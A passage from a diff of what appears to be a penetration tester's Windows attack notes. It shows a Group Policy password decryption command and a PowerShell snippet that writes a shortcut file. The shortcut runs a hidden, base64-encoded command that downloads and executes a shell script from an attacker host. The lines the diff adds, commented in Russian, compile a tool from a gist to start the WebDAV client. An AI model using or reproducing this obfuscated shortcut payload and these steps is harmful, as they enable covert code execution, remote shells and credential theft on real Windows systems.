@@ -274,3 +274,9 @@ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH
 	$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
 	$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand  		SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIANwA6ADgAMAAwADAALwBzAGgAZQBsAGwAXwA5ADAAMAAyAC4AcABzADEAJwApAAoA"
 	$link.save()
+
+
+
+# Компиляция CS
+	и активация webdav https://gist.githubusercontent.com/klezVirus/af004842a73779e1d03d47e041115797/raw/29747c92ca04c844223d1ef6c1463d7e34e271ee/EtwStartWebClient.cs
+	mcs startweb.cs /unsafe
